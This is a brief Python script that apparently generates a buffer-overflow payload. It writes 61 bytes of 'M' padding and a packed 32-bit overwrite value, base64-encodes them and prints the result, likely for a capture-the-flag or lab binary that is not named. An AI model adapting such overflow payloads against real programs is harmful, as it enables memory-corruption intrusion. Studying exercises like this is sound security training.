
import sys
import struct
import base64

buf = b'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'
buf += struct.pack('<I', 3158513820)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
